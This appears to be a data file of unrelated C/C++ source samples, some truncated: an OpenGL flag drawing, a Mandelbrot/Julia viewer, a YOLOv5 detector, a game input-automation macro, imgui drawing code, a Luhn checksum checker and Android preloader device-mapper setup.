    "#include<GL/glut.h>\nvoid init(){\n\tglClearColor(0, 0, 0, 1);\n\tglMatrixMode(GL_PROJECTION);\n    glOrtho(-200,200,-200,200,-200,200);\n\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT);\n\t//white quad\n\tglBegin(GL_QUADS);\n\tglColor3f(1, 1, 1);\n\tglVertex2i(-20,0);\n\tglVertex2i(-20, 15);\n\tglVertex2i(36, 15);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t//red quad\n\tglColor3f(1, 0, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20,0);\n\tglVertex2i(36,0);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t// blue triangle\n\tglColor3f(0, 0, 1);\n\tglBegin(GL_TRIANGLES);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20, 15);\n\tglVertex2i(-2, 0);\n\tglEnd();\n\t//pole \n\tglColor3f(0, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-25,-75);\n\tglVertex2i(-25,15);\n\tglVertex2i(-20,15 );\n\tglVertex2i(-20, -75);\n\tglEnd();\n\t//base height\n\tglColor3f(1, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-35,-102);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10,-75);\n\tglVertex2i(-10,-102);\n\tglEnd();\n\t// top stand \n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10, -75);\n\tglVertex2i(-15,-83);\n\tglEnd();\n\t//stand hieght\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40, -87);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-15,-83);\n\tglVertex2i(-15,-87);\n\tglEnd();\n\t//middle stand\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-40,-87);\n\tglVertex2i(-15,-87);\n\tglVertex2i(-20,-92);\n\tglEnd();\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-20,-92);\n\tglVertex2i(-20,-97);\n\tglEnd();\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-50,-102);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-20,-97);\n\tglVertex2i(-25,-102);\n\tglEnd();\n\n\tglFlush();\n\n\n}\nint main(int argc,char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0, 0);\n\tglutInitWindowSize(1000, 700);\n\tglutCreateWindow(\"day one\");\n\tinit();\n\tglutDisplayFunc(display );\n\tglutMainLoop();\n\t\n\n\t\n}",
    "\ufeff#include <SFML/Graphics.hpp>\r\n#include <ccomplex>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <atlstr.h>\r\n#include <random>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace sf;\r\n\r\nstd::complex<double> mandelbrot(std::complex<double> z, std::complex<double> c)\r\n{\r\n    \r\n    std::complex<double> z1(0, 0);\r\n    z1 = z * z + c;\r\n\r\n\r\n\r\n    return z1;\r\n}\r\n\r\n\r\nint IsM(std::complex<double> c, int mx)\r\n{\r\n    std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nint IsJ(std::complex<double> z, int mx, std::complex<double> c)\r\n{\r\n    std::complex<double> f(-0.7514f, -0.826f);\r\n    //std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nvoid update(int WIDTH, int HEIGHT, double ofX, double ofY, RenderWindow& window, RectangleShape shape, double scale, int maxIt, int Fnum, std::complex<double> cForJ)\r\n{\r\n\r\n    window.clear();\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2 + ofX) * scale;\r\n            double y = (j - HEIGHT / 2 + ofY) * scale;\r\n\r\n            y = -y;\r\n            if (Fnum==0)\r\n            {\r\n                Uint8 clr = IsM(std::complex<double>(x, y), maxIt);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n            else if(Fnum == 1)\r\n            {\r\n                Uint8 clr = IsJ(std::complex<double>(x, y), maxIt, cForJ);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n\r\n\r\n            \r\n            /*if (IsM(std::complex<double>(x, y), 100))\r\n            {\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }*/\r\n        }\r\n    }\r\n\r\n\r\n    window.display();\r\n}\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    int MaxIt = 50;\r\n    bool start = true;\r\n    int m = 0;\r\n    \r\n    std::complex<double> cForJ(-0.64, 0.39);\r\n    if (start)\r\n    {\r\n        std::cout << \"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u043e\u0432\\n\";\r\n        std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0443\u043c \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439 (\u043c\u0435\u043d\u044c\u0448\u0435 - \u043b\u0443\u0447\u0448\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043d\u043e \u0445\u0443\u0436\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c \u0438 \u044f\u0440\u0447\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442): \";\r\n        std::cin >> MaxIt;\r\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u044b:\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u041c\u043e\u043d\u0434\u0435\u043b\u044c\u0431\u0440\u043e\u0442\u0430: 0\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0416\u044e\u043b\u0438\u0430: 1\\n\";\r\n        std::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e: \";\r\n        std::cin >> m;\r\n        std::cout << \"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\\n\u0421\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438: \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Shift: \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Alt: \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u0435\\nU: \u043e\u0431\u043d\u043e\u0432\u0438\u0442\u044c \u044d\u043a\u0440\u0430\u043d\\n\";\r\n        std::cout << \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0441\u0434\u0435\u043b\u0430\u043d\u0430 \u0432 \u0440\u0430\u043c\u043a\u0430\u0445 \u043f\u0440\u043e\u0435\u043a\u0442\u043d\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\\n\u0428\u043a\u043e\u043b\u0430 \u21161580, 2024 \u0433.\";\r\n        \r\n        \r\n    }\r\n    std::complex<double> z(0, 0);\r\n    std::int32_t WIDTH = 200;\r\n    std::int32_t HEIGHT = 200;\r\n    double Y=0;\r\n    double X=0;\r\n\r\n    double ofX = 0;\r\n    double ofY = 0;\r\n    double scale = 0.01f;\r\n    RenderWindow window(VideoMode(WIDTH, HEIGHT), L\"\u0424\u0440\u0430\u043a\u0442\u0430\u043b\", Style::Default);\r\n    RenderWindow test(VideoMode(WIDTH, HEIGHT), L\"\u0412\u044b\u0431\u043e\u0440 \u0442\u043e\u0447\u043a\u0438\", Style::Titlebar);\r\n    \r\n    Vector2i pos = window.getPosition();\r\n    pos.x += WIDTH;\r\n\r\n    test.setPosition(pos);\r\n    \r\n    if (m!=1) \r\n    {\r\n        test.close();             \r\n    }\r\n    \r\n\r\n    window.setVerticalSyncEnabled(true);\r\n    \r\n\r\n    CircleShape sh;\r\n    sh.setScale({ 1.f,1.f });\r\n    sh.setRadius(0.5f);\r\n    sh.setFillColor(Color::Black);\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2)/50;\r\n            double y = (j - HEIGHT / 2)/50;\r\n\r\n            y = -y;\r\n            \r\n            Uint8 c = IsM(std::complex<double>(x,y),MaxIt)/2;\r\n            auto GREY = Color{c, c, c };\r\n            sh.setFillColor(GREY);\r\n            sh.setPosition(i, j);\r\n            test.draw(sh);\r\n            sh.setFillColor(Color::Black);\r\n            if (i == WIDTH/2 || j == HEIGHT/2)\r\n            {\r\n                sh.setFillColor(Color::White);\r\n                sh.setPosition(i, j);\r\n                test.draw(sh);\r\n                \r\n            }\r\n\r\n        }\r\n    }\r\n    test.display();\r\n\r\n\r\n    RectangleShape shape;\r\n    shape.setSize({ 1.f, 1.f });\r\n    shape.setFillColor(Color::White);\r\n\r\n    \r\n\r\n\r\n    update(WIDTH, HEIGHT, ofX, ofY, window, shape, scale, MaxIt, m, cForJ);\r\n    while (window.isOpen())\r\n    {\r\n        if (window.hasFocus())\r\n        {\r\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\r\n            {\r\n                ofX -= 50;\r\n                update(W",
    "#include <fstream>\n#include <opencv2/opencv.hpp>\n#include \"utils.h\"\n\nusing namespace std;\n\nvoid predictOnVideo(const auto webcamId, const bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n    Yolov5Detector::DetectionData output;\n\n    cv::VideoCapture cap(webcamId);\n    cv::Mat frame, resultImg;\n\n    cap.set(3, 640);\n    cap.set(4, 480);\n\n    while (true)\n    {\n        cap.read(frame);\n        output = detector.detect(frame, true);\n        resultImg = output.image;\n        cv::imshow(\"Webcam \" + webcamId, resultImg);\n\n        if ((cv::waitKey(1) & 0xFF) == 27)\n        {\n            break;\n        }\n    }\n}\n\nvoid predictOnImage(string imagePath, bool isCuda = false)\n{\n    Yolov5Detector detector(\"../assets/models/yolov5s.onnx\", \"../assets/classes.txt\", isCuda);\n\n    cv::Mat image = cv::imread(imagePath);\n    if (image.empty())\n    {\n        cerr << \"Error loading image\\n\";\n    }\n\n    Yolov5Detector::DetectionData output;\n    output = detector.detect(image, true);\n\n    cv::Mat resultImg = output.image;\n    vector<Yolov5Detector::Detection> detections = output.detections;\n\n    cv::imshow(\"result image\", resultImg);\n    cv::waitKey(0);\n}\n\nint findType(const string &path)\n{\n    vector<string> image_extensions = {\".jpg\", \".jpeg\", \".png\"};\n    for (const string &ext : image_extensions)\n    {\n        string lower_path = path;\n        transform(lower_path.begin(), lower_path.end(), lower_path.begin(), ::tolower);\n        if (lower_path.size() >= ext.size() && lower_path.substr(lower_path.size() - ext.size()) == ext)\n        {\n            return 0;\n        }\n    }\n\n    vector<string> video_extensions = {\".mp4\", \".avi\"};\n    for (const string &ext : video_extensions)\n    {\n        if (path.size() >= ext.size() && path.substr(path.size() - ext.size()) == ext)\n        {\n            return 1;\n        }\n    }\n\n    try\n    {\n        stod(path);\n        return 2;\n    }\n    catch (const invalid_argument &)\n    {\n        // Not a number, continue\n    }\n    catch (const out_of_range &)\n    {\n        // Not a number, continue\n    }\n\n    return -1;\n}\n\nint main(int argc, const char *argv[])\n{\n    bool isCuda = argc > 1 && strcmp(argv[1], \"cuda\") == 0;\n\n    string input = argv[1];\n    int type = findType(input);\n    if (type == -1)\n    {\n        cout << \"Please specify a valid type\" << endl;\n        return -1;\n    }\n    else if (type == 0)\n    {\n        predictOnImage(input, isCuda);\n    }\n    else if (type == 1)\n    {\n        predictOnVideo(input, isCuda);\n    }\n    else if (type == 2)\n    {\n        predictOnVideo(stoi(input), isCuda);\n    }\n}",
    "#include \"drop_mode.h\"\n#include \"string_processing.h\"\n\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <cstdio>\n\nusing namespace std::literals;\n\nDropMode::DropMode(std::string& settings_path) : path_settings_(settings_path) {\n    SetSettings();\n}\n\nvoid DropMode::MouseDown() {\n    std::cout << \"Mouse down start\"s << std::endl;\n    for (int i = 0; i < 100; i++) {\n        mouse_event(MOUSEEVENTF_MOVE, 0, 10, 0, 0);  //full down\n    }\n    std::cout << \"Mouse down end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::OpenTp() {\n    std::cout << \"Open teleport start\"s << std::endl;\n    SimulateKeyPress('E');\n    std::cout << \"Open teleport end\"s << std::endl;\n    Sleep(1000);\n}\n\nvoid DropMode::SearchClick() {\n    std::cout << \"Search click start\" << std::endl;\n    SetCursorPos(settings_.search_window.x, settings_.search_window.y);\n    Sleep(500);\n    left_button_.Click();\n    std::cout << \"Search click end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::EnterTpName(std::string& teleport_name) {\n\n    std::cout << \"Enter tp name start\"s << std::endl;\n    for (auto a : teleport_name) {\n        SimulateKeyPress(a);   //enter tp_name\n        Sleep(50);\n    }\n    std::cout << \"Enter tp name end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::ClickToTpName() {\n    std::cout << \"Click to tp name start\"s << std::endl;\n    Sleep(500);\n    SetCursorPos(settings_.first_tp_name_in_list.x, settings_.first_tp_name_in_list.y);\n    Sleep(500);\n    left_button_.Click();\n    std::cout << \"Click to tp name end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::ClickToTeleporting() {\n    std::cout << \"teleporting start\" << std::endl;\n    SetCursorPos(settings_.teleporting.x, settings_.teleporting.y); //teleport\n    Sleep(500);\n    left_button_.Click();\n    std::cout << \"teleporting end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::MouseUp() {\n\n    std::cout << \"Mouse up start\"s << std::endl;\n    for (int i = 0; i < 4/*67*/; i++) {\n        mouse_event(MOUSEEVENTF_MOVE, 0, -10, 0, 0);\n    }\n    std::cout << \"Mouse up end\"s << std::endl; \n    Sleep(200);\n}\n\nvoid DropMode::MoveTo360() {\n\n    std::cout << \"360 with E start\"s << std::endl;\n    for (int i = 0; i < 380; i++) {\n        mouse_event(MOUSEEVENTF_MOVE, -10, 0, 0, 0);\n        SimulateKeyPress('E');\n        Sleep(20);\n    }\n    std::cout << \"360 with E end\"s << std::endl;\n    Sleep(200);\n}\n\nvoid DropMode::TakeAll() {\n    Sleep(500);\n    std::cout << \"Take all start\"s << std::endl;\n    SetCursorPos(settings_.take_all.x, settings_.take_all.y);   // take everything\n    Sleep(200);\n    left_button_.Click();\n    std::cout << \"Take all end\"s << std::endl;\n    Sleep(500);\n}\n\nvoid DropMode::GiveAll() {\n    Sleep(500);\n    std::cout << \"Drop in vault start\"s << std::endl;\n    SetCursorPos(settings_.give_all.x, settings_.give_all.y);\n    Sleep(200);\n    left_button_.Click();\n    std::cout << \"Drop in vault end\\n\";\n    Sleep(500);\n}\n\nvoid DropMode::CloseInventory() {\n    Sleep(500);\n    std::cout << \"Close inventory start\"s << std::endl;\n    SetCursorPos(settings_.close_invetory.x, settings_.close_invetory.y);\n    left_button_.Click();\n    std::cout << \"Close inventory end\"s << std::endl;\n    Sleep(500);\n}\n\nvoid DropMode::LootingCrete(std::string& current_tp_name, bool take) {\n\n    system(\"cls\");\n    Sleep(5000);\n    MouseDown();\n\n    OpenTp();\n\n    SearchClick();\n\n    EnterTpName(current_tp_name);\n\n    ClickToTpName();\n\n    ClickToTeleporting();\n\n    std::cout << \"Sleep 10s\"s << std::endl;\n    Sleep(10000);\n\n    MouseUp();\n\n    MoveTo360();\n    if (take == true) {\n        TakeAll();\n    }\n    if (take == false) {\n        GiveAll();\n    }\n    CloseInventory();\n\n    std::cout << \"Sleep 10s\"s << std::endl;\n    Sleep(10000);\n}\n\nvoid DropMode::SetSettings() {\n\n    std::ifstream input;\n    input.open(path_settings_);\n    if (!input.is_open()) {\n        std::cout << \"settings were not saved file could not open file\"s << std::endl;\n        return;\n    }\n    std::string line;\n    std::size_t counter = 0;\n    bool settings_is_found = false;\n\n    while (std::getline(input, line)) {\n\n        if (settings_is_found == true && line != \"\") {\n\n            if (counter == 7 || counter == 8) {\n                std::vector<std::string> tp_names = ParseName(line);\n                if (counter == 7) {\n                    teleports_name_ = std::move(tp_names);\n                }\n                else {\n                    save_teleport_name_ = tp_names.at(0);\n                }\n                ++counter;\n                continue;\n            }\n\n            if (counter != 6) {\n                std::pair<int, int> coords = ParseCoords(line);\n\n                switch (counter) {\n                case 0:\n                    settings_.search_window.x = coords.first;\n                    settings_.search_window.y = coords.second;\n                    break;\n                case 1:\n                    settings_.first_tp_name_in_list.x = coords.first;\n                    settings_.first_tp_name_in_list.y = ",
    "// dear imgui, v1.75 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n#if !defined(alloca)\n#if defined(__GLIBC__) || defined(__sun) || defined(__CYGWIN__) || defined(__APPLE__) || defined(__SWITCH__)\n#include <alloca.h>     // alloca (glibc uses <alloca.h>. Note that Cygwin may have _WIN32 defined, so the order matters here)\n#elif defined(_WIN32)\n#include <malloc.h>     // alloca\n#if !defined(alloca)\n#define alloca _alloca  // for clang with MS Codegen\n#endif\n#else\n#include <stdlib.h>     // alloca\n#endif\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127) // condition expression is constant\n#pragma warning (disable: 4505) // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996) // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic ignored \"-Wold-style-cast\"         // warning : use of old-style cast                              // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"            // warning : comparing floating point with == or != is unsafe   // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"    // warning : declaration requires a global destructor           // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"        // warning : implicit conversion changes signedness             //\n#if __has_warning(\"-Wzero-as-null-pointer-constant\")\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning : zero as null pointer constant              // some standard header variations use #define NULL 0\n#endif\n#if __has_warning(\"-Wcomma\")\n#pragma clang diagnostic ignored \"-Wcomma\"                  // warning : possible misuse of comma operator here             //\n#endif\n#if __has_warning(\"-Wreserved-id-macro\")\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"      // warning : macro name is a reserved identifier                //\n#endif\n#if __has_warning(\"-Wdouble-promotion\")\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"       // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#endif\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// [SECTION] STB libraries implementation\n//-------------------------------------------------------------------------\n\n// Compile time options:\n//#define IMGUI_STB_NAMESPACE           ImStb\n//#define IMGUI_STB_TRUETYPE_FILENAME   \"my_folder/stb_truetype.h\"\n//#define IMGUI_STB_RECT_PACK_FILENAME  \"my_folder/stb_rect_pack.h\"\n//#define IMGUI_DISABLE_STB_TRUETYPE_IMPLEMENTATION\n//#define IMGUI_DISABLE_STB_RECT_PACK_IMPLEMENTATION\n\n#ifdef IMGUI_STB_NAMESPACE\nnamespace IMGUI_STB_NAMESPACE\n{\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (push)\n#pragma warning (disable: 4456)                             // declaration of 'xx' hides previous local declaration\n#endif\n\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wunused-function\"\n#pragma clang diagnostic ignored \"-Wmissing-prototypes\"\n#pragma clang dia",
    "#include <stdio.h>\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nbool isNumberString(const string& s) {\r\n    int len = s.length();\r\n    for (int i = 0; i < len; i++) {\r\n        if (s[i] < '0' || s[i] > '9')\r\n            return false;\r\n    }\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    string ccNumber;\r\n\r\n    cout << \"This program uses the Luhn Algorigthm to validate a CC number.\" << endl;\r\n    cout << \"You can enter 'exit' anytime to quit.\" << endl;\r\n\r\n    while (true) {\r\n\r\n        cout << \"Please enter a CC number to validate: \";\r\n        cin >> ccNumber;\r\n\r\n        if (ccNumber == \"exit\")\r\n            break;\r\n\r\n        else if (!isNumberString(ccNumber)) {\r\n            cout << \"Bad input! \";\r\n            continue;\r\n        }\r\n\r\n        int len = ccNumber.length();\r\n        int doubleEvenSum = 0;\r\n\r\n        // Step 1 is to double every second digit, starting from the right. If it\r\n        // results in a two digit number, add both the digits to obtain a single\r\n        // digit number. Finally, sum all the answers to obtain 'doubleEvenSum'.\r\n\r\n        for (int i = len - 2; i >= 0; i = i - 2) {\r\n            int dbl = ((ccNumber[i] - 48) * 2);\r\n            if (dbl > 9) {\r\n                dbl = (dbl / 10) + (dbl % 10);\r\n            }\r\n            doubleEvenSum += dbl;\r\n        }\r\n\r\n        // Step 2 is to add every odd placed digit from the right to the value\r\n        // 'doubleEvenSum'.\r\n\r\n        for (int i = len - 1; i >= 0; i = i - 2) {\r\n            doubleEvenSum += (ccNumber[i] - 48);\r\n        }\r\n\r\n        // Step 3 is to check if the final 'doubleEvenSum' is a multiple of 10.\r\n        // If yes, it is a valid CC number. Otherwise, not.\r\n\r\n        cout << (doubleEvenSum % 10 == 0 ? \"Valid!\" : \"Invalid!\") << endl;\r\n\r\n        continue;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <fcntl.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <time.h>\n#include <unistd.h>\n\n#include <chrono>\n#include <ctime>\n#include <iostream>\n#include <map>\n#include <thread>\n\n#include <android-base/file.h>\n#include <android-base/strings.h>\n#include <android-base/unique_fd.h>\n#include <libdm/dm.h>\n#include <log/log.h>\n\nusing namespace std::literals::string_literals;\nusing namespace android::dm;\n\n#define NAME_PL_A \"pl_a\"\n#define NAME_PL_B \"pl_b\"\n\n#define UFS_PL_A \"/dev/block/sda\"\n#define UFS_PL_B \"/dev/block/sdb\"\n#define UFS_DEV \"/sys/class/block/sda/uevent\"\n#define LINK_PL_A \"/dev/block/by-name/preloader_raw_a\"\n#define LINK_PL_B \"/dev/block/by-name/preloader_raw_b\"\n#define LINK1_PL_A \"/dev/block/platform/bootdevice/by-name/preloader_raw_a\"\n#define LINK1_PL_B \"/dev/block/platform/bootdevice/by-name/preloader_raw_b\"\n#define DM_BLK_SIZE (512)\n\n#define PLHEAD \"MMM\"\n#define UFSHEAD \"UFS\"\n#define EMMCHEAD \"EMMC\"\n#define COMBOHEAD \"COMB\"\n#define EMMCHSZ (0x800)\n#define UFSHSZ (0x1000)\n#define BLKSZ (512)\n\nstatic int create_dm(const char* device, const char* name, std::string* path, int start_blk,\n                     int blk_cnt) {\n  DmTable table;\n  std::unique_ptr<DmTarget> target;\n\n  if (!device || !name) {\n    ALOGE(\"%s device or name is null\\n\", __func__);\n    return 1;\n  }\n\n  ALOGD(\"create_dm dev: %s, name %s, start %d, blks %d\\n\", device, name, start_blk, blk_cnt);\n  target = std::make_unique<DmTargetLinear>(0, blk_cnt, device, start_blk);\n  if (!table.AddTarget(std::move(target))) {\n    ALOGE(\"Add target fail(%s)\", strerror(errno));\n    return 1;\n  }\n  DeviceMapper& dm = DeviceMapper::Instance();\n  if (!dm.CreateDevice(name, table, path, std::chrono::milliseconds(500))) {\n    ALOGE(\"Create %s on %s fail(%s)\", name, device, strerror(errno));\n    return 1;\n  }\n  ALOGI(\"Create %s done\", (*path).c_str());\n  return 0;\n}\n\nstatic void create_pl_link(std::string link, std::string devpath) {\n  std::string link_path;\n\n  if (android::base::Readlink(link, &link_path) && link_path != devpath) {\n    ALOGE(\"Remove symlink %s links to: %s\", link.c_str(), link_path.c_str());\n    if (!android::base::RemoveFileIfExists(link))\n      ALOGE(\"Cannot remove symlink %s\", strerror(errno));\n  }\n\n  if (symlink(devpath.c_str(), link.c_str()))\n    ALOGE(\"Failed to symlink %s to %s (%s)\", devpath.c_str(), link.c_str(), strerror(errno));\n}\n\nint create_pl_path(void) {\n  int start_blk, blk_cnt, fd;\n  off_t pl_size;\n  char header_desc[5];\n  std::string path_a, path_b, link_path, dev_path, link;\n  DeviceMapper& dm = DeviceMapper::Instance();\n  ssize_t sz = 0;\n\n  \n  fd = open(UFS_PL_A, O_RDONLY);\n  if (fd < 0) {\n    ALOGE(\"Cannot open %s (%s)\", UFS_PL_A, strerror(errno));\n    return 1;\n  }\n\n  pl_size = lseek(fd, 0, SEEK_END);\n  if (pl_size < 0) {\n    ALOGE(\"lseek fail (%s)\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n\n  ALOGD(\"pl_size: %ld\\n\", pl_size);\n  blk_cnt = pl_size / DM_BLK_SIZE;\n\n  if (lseek(fd, 0, SEEK_SET)) {\n    ALOGE(\"lseek to head fail(%s)\\n\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n\n  if ((sz = read(fd, header_desc, sizeof(header_desc))) < 0) {\n    ALOGE(\"read fail(%s)\", strerror(errno));\n    close(fd);\n    return 1;\n  }\n  if (sz != sizeof(header_desc)) ALOGE(\"%s size is not header_desc\\n\", __func__);\n\n  close(fd);\n\n  header_desc[sizeof(header_desc) - 1] = 0;\n  if (!strncmp(header_desc, EMMCHEAD, strlen(EMMCHEAD))) {\n    start_blk = EMMCHSZ / BLKSZ;\n  } else if (!strncmp(header_desc, UFSHEAD, strlen(UFSHEAD)) ||\n             !strncmp(header_desc, COMBOHEAD, strlen(COMBOHEAD))) {\n    start_blk = UFSHSZ / BLKSZ;\n  } else {\n    ALOGE(\"Invalid header %s\", header_desc);\n    return 1;\n  }\n\n  blk_cnt -= start_blk;\n  \n  if (create_dm(UFS_PL_A, NAME_PL_A, &path_a, start_blk, blk_cnt) != 0) {\n    return 1;\n  }\n  if (create_dm(UFS_PL_B, NAME_PL_B, &path_b, start_blk, blk_cnt) != 0) {\n    if (dm.DeleteDevice(UFS_PL_A))\n      ALOGE(\"Cannot delete device %s (%s)\", NAME_PL_A, strerror(errno));\n    return 1;\n  }\n  \n\n  create_pl_link(LINK_PL_A, path_a);\n  create_pl_link(LINK_PL_B, path_b);\n  create_pl_link(LINK1_PL_A, path_a);\n  create_pl_link(LINK1_PL_B, path_b);\n  return 0;\n}\n\nint main(void) {\n  return create_pl_path();\n}\n",
